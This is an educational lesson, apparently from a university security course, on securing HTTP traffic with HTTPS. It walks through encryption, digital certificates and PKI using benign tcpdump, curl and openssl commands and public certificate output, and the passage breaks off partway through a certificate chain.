&lt;li>The use of &lt;code>-s&lt;/code> / &lt;code>--signoff&lt;/code> when creating a commit is optional, but strongly recommended.&lt;/li>
&lt;/ul></description></item><item><title>Web:</title><link>/web/securing-communication/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/web/securing-communication/</guid><description>
&lt;h1 id="securing-communication">Securing Communication&lt;/h1>
&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>As part of this session, we look into how HTTP connections can be made secure, to prevent attacks that capture traffic, also called &lt;a href="https://www.thesslstore.com/blog/man-in-the-middle-attack-2/">man-in-the-middle (MitM) attacks&lt;/a>.
The session is focused on understanding certificates and HTTPS and investigating configurations of existing setups.&lt;/p>
&lt;h2 id="reminders-and-prerequisites">Reminders and Prerequisites&lt;/h2>
&lt;p>HTTP (&lt;em>Hypertext Transfer Protocol&lt;/em>) is the main protocol of the web.
It has several characteristics:&lt;/p>
&lt;ul>
&lt;li>it is plain text&lt;/li>
&lt;li>it doesn&amp;rsquo;t maintain an active connection&lt;/li>
&lt;li>it&amp;rsquo;s a request-response protocol&lt;/li>
&lt;li>it provides a series of codes to mark the types of requests and replies&lt;/li>
&lt;li>HTTP requests consists of paths (routes) that are mapped to resources&lt;/li>
&lt;/ul>
&lt;p>The lack of an active connection session is compensated by the use of cookies.
Similarly, the plain text nature of the protocol means that anyone could read contents in HTTP network packets.
This is alleviated by the use of HTTPS.
Nowadays, most connections use HTTPS precisely because of the need for confidentiality.&lt;/p>
&lt;p>In the previous session, you used web browsers and the &lt;a href="https://developer.mozilla.org/en-US/docs/Learn/Common_questions/What_are_browser_developer_tools">Developer Tools&lt;/a> feature of modern browsers to inspect traffic, update cookies, inspect rendered pages.
GUI web browsers (such as Firefox, Chrome, Edge, Safari) provide the appealing interface for users to surf the web.
For quick and dirty tasks such as testing connections, making requests and downloading large files, we use CLI web clients such as &lt;code>curl&lt;/code> and &lt;code>wget&lt;/code>.
We will be using these in this session as well.&lt;/p>
&lt;h2 id="confidentiality">Confidentiality&lt;/h2>
&lt;p>Confidentiality is a security property that prevents captured data from being understood by an attacker.
If an attacker captures data with confidentiality ensured, the attacker must not be able to extract actual information from it.
Confidentiality is generally provided with encryption.&lt;/p>
&lt;p>For example, a classical HTTP connection is plain text and thus non-confidential.
Let&amp;rsquo;s exemplify this.
On one terminal, start a &lt;code>tcpdump&lt;/code> capture session for HTTP connections:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ sudo tcpdump -A tcp port 80
&lt;/code>&lt;/pre>&lt;p>On another terminal, make an HTTP connection using &lt;code>curl&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ curl http://elf.cs.pub.ro
&lt;/code>&lt;/pre>&lt;p>As the connection is HTTP, you will see plain text messages as part of the &lt;code>tcpdump&lt;/code> output:&lt;/p>
&lt;pre tabindex="0">&lt;code>Host: elf.cs.pub.ro
User-Agent: curl/7.58.0
Accept: */*
[...]
Date: Sun, 03 Jul 2022 15:51:46 GMT
Server: Apache/2.4.38 (Debian)
Last-Modified: Mon, 02 Aug 2010 17:58:06 GMT
ETag: &amp;#34;a8-48cdaf14da780&amp;#34;
Accept-Ranges: bytes
Content-Length: 168
Vary: Accept-Encoding
Content-Type: text/html
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;meta name=&amp;#34;google-site-verification&amp;#34; content=&amp;#34;gTsIxyV43HSJraRPl6X1A5jzGFgQ3N__hKAcuL2QsO8&amp;#34; /&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;h1&amp;gt;It works!&amp;lt;/h1&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;p>However, if we used &lt;code>curl&lt;/code> and an HTTPS connection:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ curl https://elf.cs.pub.ro
&lt;/code>&lt;/pre>&lt;p>there would be no plain text output on the &lt;code>tcpdump&lt;/code> console, because the connection is using a confidential (encrypted) channel.&lt;/p>
&lt;p>The same traffic inspection can be done in a more visual manner using Wireshark.&lt;/p>
&lt;p>As long as traffic is not encrypted, an attacker able to capture packets (either fooling someone to get the data or simply accessing a networking equipment along the way) will read the traffic contents.
HTTPS uses public key cryptography to ensure the confidentiality of network traffic.&lt;/p>
&lt;h2 id="public-key-cryptography-certificates">Public Key Cryptography. Certificates&lt;/h2>
&lt;p>There are mainly two types of encryption: symmetric and public-key encryption.&lt;/p>
&lt;p>In symmetric encryption, a key is shared among the two ends in the communication.&lt;/p>
&lt;p>&lt;img src="assets/symmetric-encryption.svg" alt="symmetric encryption">&lt;/p>
&lt;p>That same key is used for both encrypting and decrypting data.
AES (&lt;em>Advanced Encryption Standard&lt;/em>) is the standard symmetric encryption algorithm.
The main benefit of symmetric encryption algorithms is their relative simplicity and speed: they are easy to implement and are fast, with the option of having hardware support.
The downside is related to the shared key.
If the key is captured by an attacker or if it is lost by one of the ends, confidentiality is compromised.&lt;/p>
&lt;p>So, the goal is that each connection should use a temporary shared key.
After the connection ends, the shared key is discarded.
A new connection will generate a new key.
Of course, that shared key must be known only by the two ends.
For this two happen, key exchange algorithms, such as &lt;a href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange">Diffie Hellman&lt;/a> are used.&lt;/p>
&lt;p>Diffie-Hellman (often abbreviated as DH) is based on public-key encryption.
In short we use public-key encryption to set up a temporary shared key for the actual communication.&lt;/p>
&lt;p>Public-key encryption, as its name implies, relies on a pair of private and public keys that are connected mathematically.
RSA (&lt;em>Rivest Shamir Adleman&lt;/em> - named after its inventors) is the classical public key cryptographic algorithm.
The private key is generated as a random set of bytes and the public key is generated from it, via a mathematical algorithm.
The private key is only available to the owner, whereas the public key is available to everyone.
Anyone can encrypt a message using the public key, but only the owner can decrypt the message using the private key, as shown below.&lt;/p>
&lt;p>&lt;img src="assets/public-key-encryption.svg" alt="public-key encryption">&lt;/p>
&lt;p>Because of this, public-key encryption is considered more secure than symmetric encryption, as it doesn&amp;rsquo;t require the passing of a shared key between parties, an act that may be intercepted.
At the same time, public-key encryption is much slower than symmetric encryption.
Because of this, public-key encryption is only used to set up an initial session and enable a key exchange algorithm (such as Diffie-Hellman) to generate a temporary session-specific shared key.&lt;/p>
&lt;h3 id="identity-management-certificates">Identity Management. Certificates&lt;/h3>
&lt;p>A public-private key pair is not only used for encryption.
It&amp;rsquo;s also used for identity management.&lt;/p>
&lt;p>Identity management means making sure a given entity is who they claim they are.
In HTTPS that means that if we connect to &lt;code>google.com&lt;/code> we are offered guarantees that the server we connect to is indeed &lt;code>google.com&lt;/code>.
Otherwise, another server could impersonate the target server and capture all traffic.&lt;/p>
&lt;p>Identity management relies on signing and verifying messages using public-private keys.
The private key is used to sign a message.
The signed message is provided publicly.
Then, the public key is used to verify the message.
This is called a &lt;strong>digital signature&lt;/strong>, as shown below:&lt;/p>
&lt;p>&lt;img src="assets/digital-signature.svg" alt="digital signature">&lt;/p>
&lt;p>In HTTPS, this means that the web server will sign the message with its private key and web clients will verify the message with the public key.&lt;/p>
&lt;p>In order for this to work, the public key has to be attached the identity: the name of the server.
This is done via a &lt;strong>digital certificate&lt;/strong>.
A certificate is a file that consists of a public key and an identity.
A certificate itself is also signed to ensure its validity.
This means that a certificate will also be verified using a public key, found as part of another certificate, as shown below:&lt;/p>
&lt;p>&lt;img src="assets/digital-certificate.png" alt="digital certificate">&lt;/p>
&lt;p>This dependency between certificates creates a &lt;strong>public-key infrastructure&lt;/strong> (PKI), on top of which self-signed root certificates are located.
Self-signed root certificates part of &lt;strong>Certification Authorities&lt;/strong>.
These are entities that sign other certificates to validate the binding of a public key to an identity.&lt;/p>
&lt;p>A browser stores root certificates as part of its default installation.
Each connection to the server will get the server to provide the certificate: identity and public key.
The browser uses the root certificate and intermediary certificates to verify the certificate.
After its verification the public key is used to create the actual HTTPS (secure) connection.&lt;/p>
&lt;h3 id="inspecting-certificates">Inspecting Certificates&lt;/h3>
&lt;p>To get a better understanding of how certificates work, let&amp;rsquo;s take a look at one.&lt;/p>
&lt;p>In order to get a certificate to inspect, it is easiest to export a root certificate from a browser.
In Firefox, we can use the Certificate Manager, as shown in the image below to export a certificate:&lt;/p>
&lt;p>&lt;img src="assets/firefox-certificate-manager.png" alt="Firefox Certificate Manager">&lt;/p>
&lt;p>The CA (root) certificate from Verisign is located in &lt;code>assets/VerisignClass1PublicPrimaryCertificationAuthority-G3.crt&lt;/code>.
The certificate, as most certificates, is exported in PEM (&lt;em>Privacy Enhanced Mail&lt;/em>) format, a Base64 encoding:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat assets/VerisignClass1PublicPrimaryCertificationAuthority-G3.crt
-----BEGIN CERTIFICATE-----
MIIEGjCCAwICEQCLW3VWhFSFCwDPrzhIzrGkMA0GCSqGSIb3DQEBBQUAMIHKMQsw
CQYDVQQGEwJVUzEXMBUGA1UEChMOVmVyaVNpZ24sIEluYy4xHzAdBgNVBAsTFlZl
cmlTaWduIFRydXN0IE5ldHdvcmsxOjA4BgNVBAsTMShjKSAxOTk5IFZlcmlTaWdu
LCBJbmMuIC0gRm9yIGF1dGhvcml6ZWQgdXNlIG9ubHkxRTBDBgNVBAMTPFZlcmlT
aWduIENsYXNzIDEgUHVibGljIFByaW1hcnkgQ2VydGlmaWNhdGlvbiBBdXRob3Jp
dHkgLSBHMzAeFw05OTEwMDEwMDAwMDBaFw0zNjA3MTYyMzU5NTlaMIHKMQswCQYD
VQQGEwJVUzEXMBUGA1UEChMOVmVyaVNpZ24sIEluYy4xHzAdBgNVBAsTFlZlcmlT
aWduIFRydXN0IE5ldHdvcmsxOjA4BgNVBAsTMShjKSAxOTk5IFZlcmlTaWduLCBJ
bmMuIC0gRm9yIGF1dGhvcml6ZWQgdXNlIG9ubHkxRTBDBgNVBAMTPFZlcmlTaWdu
IENsYXNzIDEgUHVibGljIFByaW1hcnkgQ2VydGlmaWNhdGlvbiBBdXRob3JpdHkg
LSBHMzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAN2E1Lm0+afY8wR4
nN493GwTFtl63SRRZsDHJlkNrAYIwpTRMx/wgzUfbhvI3qpuFU5UJ+/EbRrsC+MO
8ESlV8dAWB6jRx9x7GD2bZTIGDnt/kIYVt/kTEkQeE4BdjVjEjbdZrwBBDajVWjV
ojYJrKshJlQGrT/KFOCsyq0GHZXi+J3x4GD/wn91K0zM2v6HmSHquv4+VNfSWXjb
PG7PoBMAGrgnoeS+Z5bKoMWznN3JdZ7rMJpfo83ZrngZPyPpXNspva1VyBtUjGP2
6KbqxzcSXKMpHgLZ2x87tNcPVkeBFQRKr4Mn0cVYiMHd9qqnoxjaaKptEVHhv2Vr
n5Z20T0CAwEAATANBgkqhkiG9w0BAQUFAAOCAQEAq2aN17O6x5q25lXQBfGfMY1a
qtmqRiYPce2lrVNWYgFHKkTp/j90CxObufRNG7LRX7K20ohcs5/Ny9Sn2WCVhDr4
wTcdYcrnsMXlkdpUpqwxga6X3s0IrLjAl4B/bnKk52kTlWUfxJM8/XmPBNQ+T+r3
ns7NZ3xPZQL/kYVUc8f/NveGLezQXk//EZ9yBta4GvFMDSZl4kSAHsef493oCtrs
pSCAaWihT37ha88HQfqDjrw43bAuEbFrskLMmrz5SCJ5ShkPshw+IHTZasO+8ih4
E1Z5T21Q6huwtVexN2ZYI/PcD98Kh8TvhgXVOBRgmaNL3gaWcSzy27YfpO8/7g==
-----END CERTIFICATE-----
&lt;/code>&lt;/pre>&lt;p>In its basic format, the certificate is a binary file.
The PEM format is used to make it printable.
The PEM format is also used for storing private and public SSH keys, so it may seem familiar.&lt;/p>
&lt;p>We can inspect the certificate with &lt;code>openssl&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ openssl x509 -noout -text -in assets/VerisignClass1PublicPrimaryCertificationAuthority-G3.crt
Certificate:
Data:
Version: 1 (0x0)
Serial Number:
8b:5b:75:56:84:54:85:0b:00:cf:af:38:48:ce:b1:a4
Signature Algorithm: sha1WithRSAEncryption
Issuer: C = US, O = &amp;#34;VeriSign, Inc.&amp;#34;, OU = VeriSign Trust Network, OU = &amp;#34;(c) 1999 VeriSign, Inc. - For authorized use only&amp;#34;, CN = VeriSign Class 1 Public Primary Certification Authority - G3
Validity
Not Before: Oct 1 00:00:00 1999 GMT
Not After : Jul 16 23:59:59 2036 GMT
Subject: C = US, O = &amp;#34;VeriSign, Inc.&amp;#34;, OU = VeriSign Trust Network, OU = &amp;#34;(c) 1999 VeriSign, Inc. - For authorized use only&amp;#34;, CN = VeriSign Class 1 Public Primary Certification Authority - G3
Subject Public Key Info:
Public Key Algorithm: rsaEncryption
RSA Public-Key: (2048 bit)
Modulus:
00:dd:84:d4:b9:b4:f9:a7:d8:f3:04:78:9c:de:3d:
dc:6c:13:16:d9:7a:dd:24:51:66:c0:c7:26:59:0d:
ac:06:08:c2:94:d1:33:1f:f0:83:35:1f:6e:1b:c8:
de:aa:6e:15:4e:54:27:ef:c4:6d:1a:ec:0b:e3:0e:
f0:44:a5:57:c7:40:58:1e:a3:47:1f:71:ec:60:f6:
6d:94:c8:18:39:ed:fe:42:18:56:df:e4:4c:49:10:
78:4e:01:76:35:63:12:36:dd:66:bc:01:04:36:a3:
55:68:d5:a2:36:09:ac:ab:21:26:54:06:ad:3f:ca:
14:e0:ac:ca:ad:06:1d:95:e2:f8:9d:f1:e0:60:ff:
c2:7f:75:2b:4c:cc:da:fe:87:99:21:ea:ba:fe:3e:
54:d7:d2:59:78:db:3c:6e:cf:a0:13:00:1a:b8:27:
a1:e4:be:67:96:ca:a0:c5:b3:9c:dd:c9:75:9e:eb:
30:9a:5f:a3:cd:d9:ae:78:19:3f:23:e9:5c:db:29:
bd:ad:55:c8:1b:54:8c:63:f6:e8:a6:ea:c7:37:12:
5c:a3:29:1e:02:d9:db:1f:3b:b4:d7:0f:56:47:81:
15:04:4a:af:83:27:d1:c5:58:88:c1:dd:f6:aa:a7:
a3:18:da:68:aa:6d:11:51:e1:bf:65:6b:9f:96:76:
d1:3d
Exponent: 65537 (0x10001)
Signature Algorithm: sha1WithRSAEncryption
ab:66:8d:d7:b3:ba:c7:9a:b6:e6:55:d0:05:f1:9f:31:8d:5a:
aa:d9:aa:46:26:0f:71:ed:a5:ad:53:56:62:01:47:2a:44:e9:
fe:3f:74:0b:13:9b:b9:f4:4d:1b:b2:d1:5f:b2:b6:d2:88:5c:
b3:9f:cd:cb:d4:a7:d9:60:95:84:3a:f8:c1:37:1d:61:ca:e7:
b0:c5:e5:91:da:54:a6:ac:31:81:ae:97:de:cd:08:ac:b8:c0:
97:80:7f:6e:72:a4:e7:69:13:95:65:1f:c4:93:3c:fd:79:8f:
04:d4:3e:4f:ea:f7:9e:ce:cd:67:7c:4f:65:02:ff:91:85:54:
73:c7:ff:36:f7:86:2d:ec:d0:5e:4f:ff:11:9f:72:06:d6:b8:
1a:f1:4c:0d:26:65:e2:44:80:1e:c7:9f:e3:dd:e8:0a:da:ec:
a5:20:80:69:68:a1:4f:7e:e1:6b:cf:07:41:fa:83:8e:bc:38:
dd:b0:2e:11:b1:6b:b2:42:cc:9a:bc:f9:48:22:79:4a:19:0f:
b2:1c:3e:20:74:d9:6a:c3:be:f2:28:78:13:56:79:4f:6d:50:
ea:1b:b0:b5:57:b1:37:66:58:23:f3:dc:0f:df:0a:87:c4:ef:
86:05:d5:38:14:60:99:a3:4b:de:06:96:71:2c:f2:db:b6:1f:
a4:ef:3f:ee
&lt;/code>&lt;/pre>&lt;p>The options passed to the &lt;code>openssl&lt;/code> command are:&lt;/p>
&lt;ul>
&lt;li>&lt;code>x509&lt;/code>: work with X.509 certificates - a standard for certificates&lt;/li>
&lt;li>&lt;code>-noout&lt;/code>: do not print the PEM output of the certificate&lt;/li>
&lt;li>&lt;code>-text&lt;/code>: print as text the contents of the certificate&lt;/li>
&lt;li>&lt;code>-in&lt;/code>: the input certificate file&lt;/li>
&lt;/ul>
&lt;p>As shown in the output, a certificate comprises of data and the signature of that data.
The data is primarily composed of the:&lt;/p>
&lt;ul>
&lt;li>identity (the &lt;code>Subject&lt;/code> attribute): &lt;code>C = US, O = &amp;quot;VeriSign, Inc.&amp;quot;, OU = VeriSign Trust Network, OU = &amp;quot;(c) 1999 VeriSign, Inc. - For authorized use only&amp;quot;, CN = VeriSign Class 1 Public Primary Certification Authority - G3&lt;/code>&lt;/li>
&lt;li>the public key (comprised of a &lt;code>Modulus&lt;/code> and &lt;code>Exponent&lt;/code>)&lt;/li>
&lt;/ul>
&lt;p>There are two other important items:&lt;/p>
&lt;ul>
&lt;li>the issuer, i.e. the entity that signed the certificate;
in this case, it&amp;rsquo;s a self signed certificate, so the &lt;code>Issuer&lt;/code> is the same as the &lt;code>Subject&lt;/code>&lt;/li>
&lt;li>the validity of the certificate, in this case it&amp;rsquo;s &lt;code>July 16, 2036&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>Generally, a certificate is only valid for one year and then it will have to be renewed.
Renewing means a new public key is generated and, together with the same identity information, a new certificate.&lt;/p>
&lt;p>The &lt;code>openssl&lt;/code> utility has command-line options to only print parts of the certificate.
For example, to only print the issuer or the public key, we would use the &lt;code>-issuer&lt;/code> or &lt;code>-pubkey&lt;/code> options:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ openssl x509 -noout -issuer -in assets/VerisignClass1PublicPrimaryCertificationAuthority-G3.crt
issuer=C = US, O = &amp;#34;VeriSign, Inc.&amp;#34;, OU = VeriSign Trust Network, OU = &amp;#34;(c) 1999 VeriSign, Inc. - For authorized use only&amp;#34;, CN = VeriSign Class 1 Public Primary Certification Authority - G3
$ openssl x509 -noout -pubkey -in assets/VerisignClass1PublicPrimaryCertificationAuthority-G3.crt
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3YTUubT5p9jzBHic3j3c
bBMW2XrdJFFmwMcmWQ2sBgjClNEzH/CDNR9uG8jeqm4VTlQn78RtGuwL4w7wRKVX
x0BYHqNHH3HsYPZtlMgYOe3+QhhW3+RMSRB4TgF2NWMSNt1mvAEENqNVaNWiNgms
qyEmVAatP8oU4KzKrQYdleL4nfHgYP/Cf3UrTMza/oeZIeq6/j5U19JZeNs8bs+g
EwAauCeh5L5nlsqgxbOc3cl1nuswml+jzdmueBk/I+lc2ym9rVXIG1SMY/bopurH
NxJcoykeAtnbHzu01w9WR4EVBEqvgyfRxViIwd32qqejGNpoqm0RUeG/ZWuflnbR
PQIDAQAB
-----END PUBLIC KEY-----
&lt;/code>&lt;/pre>&lt;h3 id="verifying-certificates">Verifying Certificates&lt;/h3>
&lt;p>As the VeriSign certificate is self-signed, we can use it to verify itself:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ openssl verify -CAfile assets/VerisignClass1PublicPrimaryCertificationAuthority-G3.crt assets/VerisignClass1PublicPrimaryCertificationAuthority-G3.crt
assets/VerisignClass1PublicPrimaryCertificationAuthority-G3.crt: OK
&lt;/code>&lt;/pre>&lt;p>The &lt;code>-CAfile&lt;/code> option points to the CA certificate to verify the current one.
As this is is a self signed certificate, we use itself as CA.&lt;/p>
&lt;h2 id="https-ssl-and-tls">HTTPS, SSL and TLS&lt;/h2>
&lt;p>HTTPS is the secure version of HTTP providing identity management, confidentiality and integrity.
HTTPS relies on at least the HTTP server providing a certificate that validates the identity.
The client can also do that, as part of &lt;a href="https://comodosslstore.com/blog/what-is-ssl-tls-client-authentication-how-does-it-work.html">client certificate authentication&lt;/a>.&lt;/p>
&lt;p>After validating the identity of the server, the client-server pair create a secure channel by agreeing on a per-session shared symmetric encryption key.
This is negotiated via a key-exchange algorithm such as Diffie-Hellman.
Then, all traffic between client and server will be encrypted.&lt;/p>
&lt;p>This entire process is facilitated by the use of SSL (&lt;em>Secure Sockets Layer&lt;/em>) or TLS (&lt;em>Transport Layer Security&lt;/em>).
We say that HTTPS is HTTP plus SSL / TLS support.
Note that this is the case with other secure protocol variants such as SMTPS, IMAPS, LDAPS.&lt;/p>
&lt;p>SSL / TLS usually refer to the same thing.
TLS is a newer version of the protocol.
Version are SSL1.0, SSL2.0, SSL3.0, TLS1.0, TLS1.1, TLS1.2, TLS1.3.
Each newer version comes with fixes and extra security guarantees.
Nowadays (2022) all SSL versions and TLS1.0 are considered insecure.
This is due both to internal design issues and to weak cryptographic algorithms or the allowing cryptographic keys of insufficient size.&lt;/p>
&lt;p>A summary of attacks on SSL / TLS is summarized as part of &lt;a href="https://tools.ietf.org/html/rfc7457">RFC 7457&lt;/a>.
Additional information can be found &lt;a href="https://www.acunetix.com/blog/articles/tls-vulnerabilities-attacks-final-part/">here&lt;/a> and &lt;a href="https://www.cloudinsidr.com/content/known-attack-vectors-against-tls-implementation-vulnerabilities/">here&lt;/a>.
Well known SSL / TLS attacks are:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://weakdh.org/logjam.html">Logjam&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://backronym.fail/">BACKRONYM&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://drownattack.com/">DROWN&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>A typical target of the attacker is downgrading the connection from HTTPS to HTTP.
Or downgrading the SSL / TLS protocol version to a less secure variant.
Read more on protocol downgrade &lt;a href="https://www.venafi.com/blog/preventing-downgrade-attacks">here&lt;/a>.&lt;/p>
&lt;h3 id="capturing-inspecting-and-verifying-https-certificates">Capturing, Inspecting and Verifying HTTPS Certificates&lt;/h3>
&lt;p>If you want to extract and inspect the certificate of an HTTPS server we would use the command below:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ openssl s_client -showcerts -connect www.google.com:443 -servername www.google.com &amp;lt; /dev/null
CONNECTED(00000005)
depth=2 C = US, O = Google Trust Services LLC, CN = GTS Root R1
verify return:1
depth=1 C = US, O = Google Trust Services LLC, CN = GTS CA 1C3
verify return:1
depth=0 CN = www.google.com
verify return:1
---
Certificate chain
0 s:CN = www.google.com
i:C = US, O = Google Trust Services LLC, CN = GTS CA 1C3
-----BEGIN CERTIFICATE-----
MIIEiTCCA3GgAwIBAgIRAJ8HSxF0Xxb8EiN1+lh5k/AwDQYJKoZIhvcNAQELBQAw
RjELMAkGA1UEBhMCVVMxIjAgBgNVBAoTGUdvb2dsZSBUcnVzdCBTZXJ2aWNlcyBM
TEMxEzARBgNVBAMTCkdUUyBDQSAxQzMwHhcNMjIwNjA2MDk0MDAwWhcNMjIwODI5
MDkzOTU5WjAZMRcwFQYDVQQDEw53d3cuZ29vZ2xlLmNvbTBZMBMGByqGSM49AgEG
CCqGSM49AwEHA0IABD8O7cXWSPQhh/GihqJi+gdtpS0vAt2GeDRHBaVeB8x5dDtx
3us2TGW2WJGfC7VeSVHCX1uDXkjAIOTauMUjCu2jggJoMIICZDAOBgNVHQ8BAf8E
BAMCB4AwEwYDVR0lBAwwCgYIKwYBBQUHAwEwDAYDVR0TAQH/BAIwADAdBgNVHQ4E
FgQUWVwHKuk+m9ZD0/h/+Jsgactucp8wHwYDVR0jBBgwFoAUinR/r4XN7pXNPZzQ
4kYU83E1HScwagYIKwYBBQUHAQEEXjBcMCcGCCsGAQUFBzABhhtodHRwOi8vb2Nz
cC5wa2kuZ29vZy9ndHMxYzMwMQYIKwYBBQUHMAKGJWh0dHA6Ly9wa2kuZ29vZy9y
ZXBvL2NlcnRzL2d0czFjMy5kZXIwGQYDVR0RBBIwEIIOd3d3Lmdvb2dsZS5jb20w
IQYDVR0gBBowGDAIBgZngQwBAgEwDAYKKwYBBAHWeQIFAzA8BgNVHR8ENTAzMDGg
L6AthitodHRwOi8vY3Jscy5wa2kuZ29vZy9ndHMxYzMvUU92SjBOMXNUMkEuY3Js
MIIBBQYKKwYBBAHWeQIEAgSB9gSB8wDxAHYAUaOw9f0BeZxWbbg3eI8MpHrMGyfL
956IQpoN/tSLBeUAAAGBOJmjFwAABAMARzBFAiEA7Pub0IWm5kMWJrfJGLqP4lZU
71J6No/RLMwsvXWzVfACICJMzt/AFBsNQ1t970tVRnhmgsgz2s6deykihInBRfZR
AHcARqVV63X6kSAwtaKJafTzfREsQXS+/Um4havy/HD+bUcAAAGBOJmjPwAABAMA
SDBGAiEA92vym4NTX/SmjhAx7ICLE4KXpQFsWfhvRf1m5B6qby8CIQCVyyWh2t22
UhaaKSS+nIypJ9jWtOO4wG1gVkty8c/XETANBgkqhkiG9w0BAQsFAAOCAQEAI8fX
MKLNXXoMJk6WTJvV1ORE6kYVtyZm0wM64yV9V1zmksWDgOx9xHmoAUTQYeSq6rhI
tTxgb9EmDF8gVrOXwY31WpWjJyJQAfQcn3LhPUzJnr8yqyiwfVD1FG5gKQTTlblr
g9sZ+zfETFPXTFJeGT5yBxcT8xQDQNERblVkaQ1H5f2XYuXAJJ4vlNCu7AFil1tp
U4bau/EfQPx5Jd1bLxJwbeF9FbuQvcMeow+4ElcpC5BSkzsRk7lUbZfj7NWZas5t
3yp0UncNl+Pib3p0ooLDJ3HQvlQuL4AAg2nYkL+UKusZ9d/22RmbiyGkqr+3L/3+
PKvAVy9/DNPwW3YUbQ==
-----END CERTIFICATE-----
1 s:C = US, O = Google Trust Services LLC, CN = GTS CA 1C3
i:C = US, O = Google Trust Services LLC, CN = GTS Root R1
-----BEGIN CERTIFICATE-----
MIIFljCCA36gAwIBAgINAgO8U1lrNMcY9QFQZjANBgkqhkiG9w0BAQsFADBHMQsw
CQYDVQQGEwJVUzEiMCAGA1UEChMZR29vZ2xlIFRydXN0IFNlcnZpY2VzIExMQzEU
MBIGA1UEAxMLR1RTIFJvb3QgUjEwHhcNMjAwODEzMDAwMDQyWhcNMjcwOTMwMDAw
MDQyWjBGMQswCQYDVQQGEwJVUzEiMCAGA1UEChMZR29vZ2xlIFRydXN0IFNlcnZp
Y2VzIExMQzETMBEGA1UEAxMKR1RTIENBIDFDMzCCASIwDQYJKoZIhvcNAQEBBQAD
ggEPADCCAQoCggEBAPWI3+dijB43+DdCkH9sh9D7ZYIl/ejLa6T/belaI+KZ9hzp
kgOZE3wJCor6QtZeViSqejOEH9Hpabu5dOxXTGZok3c3VVP+ORBNtzS7XyV3NzsX
lOo85Z3VvMO0Q+sup0fvsEQRY9i0QYXdQTBIkxu/t/bgRQIh4JZCF8/ZK2VWNAcm
BA2o/X3KLu/qSHw3TT8An4Pf73WELnlXXPxXbhqW//yMmqaZviXZf5YsBvcRKgKA
gOtjGDxQSYflispfGStZloEAoPtR28p3CwvJlk/vcEnHXG0g/Zm0tOLKLnf9LdwL
tmsTDIwZKxeWmLnwi/agJ7u2441Rj72ux5uxiZ0CAwEAAaOCAYAwggF8MA4GA1Ud
DwEB/wQEAwIBhjAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwEgYDVR0T
AQH/BAgwBgEB/wIBADAdBgNVHQ4EFgQUinR/r4XN7pXNPZzQ4kYU83E1HScwHwYD
VR0jBBgwFoAU5K8rJnEaK0gnhS9SZizv8IkTcT4waAYIKwYBBQUHAQEEXDBaMCYG
CCsGAQUFBzABhhpodHRwOi8vb2NzcC5wa2kuZ29vZy9ndHNyMTAwBggrBgEFBQcw
AoYkaHR0cDovL3BraS5nb29nL3JlcG8vY2VydHMvZ3RzcjEuZGVyMDQGA1UdHwQt
MCswKaAnoCWGI2h0dHA6Ly9jcmwucGtpLmdvb2cvZ3RzcjEvZ3RzcjEuY3JsMFcG
A1UdIARQME4wOAYKKwYBBAHWeQIFAzAqMCgGCCsGAQUFBwIBFhxodHRwczovL3Br
aS5nb29nL3JlcG9zaXRvcnkvMAgGBmeBDAECATAIBgZngQwBAgIwDQYJKoZIhvcN
AQELBQADggIBAIl9rCBcDDy+mqhXlRu0rvqrpXJxtDaV/d9AEQNMwkYUuxQkq/BQ
cSLbrcRuf8/xam/IgxvYzolfh2yHuKkMo5uhYpSTld9brmYZCwKWnvy15xBpPnrL
RklfRuFBsdeYTWU0AIAaP0+fbH9JAIFTQaSSIYKCGvGjRFsqUBITTcFTNvNCCK9U
+o53UxtkOCcXCb1YyRt8OS1b887U7ZfbFAO/CVMkH8IMBHmYJvJh8VNS/UKMG2Yr
PxWhu//2m+OBmgEGcYk1KCTd4b3rGS3hSMs9WYNRtHTGnXzGsYZbr8w0xNPM1IER
lQCh9BIiAfq0g3GvjLeMcySsN1PCAJA/Ef5c7TaUEDu9Ka7ixzpiO2xj2YC/WXGs
Yye5TBeg2vZzFb8q3o/zpWwygTMD0IZRcZk0upONXbVRWPeyk+gB9lm+cZv9TSjO
z23HFtz30dZGm6fKa+l3D/2gthsjgx0QGtkJAITgRNOidSOzNIb2ILCkXhAd4FJG
AJ2xDx8hcFH1mt0G/FX0Kw4zd8NLQsLxdxP8c4CU6x+7Nz/OAipmsHMdMqUybDKw
juDEI/9bfU1lcKwrmz3O2+BtjjKAvpafkmO8l7tdufThcV4q5O8DIrGKZTqPwJNl
1IXNDw9bg1kWRxYtnCQ6yICmJhSFm/Y3m6xv+cXDBlHz4n/FsRC6UfTd
-----END CERTIFICATE-----
2 s:C = US, O = Google Trust Services LLC, CN = GTS Root R1
i:C = BE, O = GlobalSign nv-sa, OU = Root CA, CN = GlobalSign Root CA
-----BEGIN CERTIFICATE-----
MIIFYjCCBEqgAwIBAgIQd70NbNs2+RrqIQ/E8FjTDTANBgkqhkiG9w0BAQsFADBX
MQswCQYDVQQGEwJCRTEZMBcGA1UEChMQR2xvYmFsU2lnbiBudi1zYTEQMA4GA1UE
CxMHUm9vdCBDQTEbMBkGA1UEAxMSR2xvYmFsU2lnbiBSb290IENBMB4XDTIwMDYx
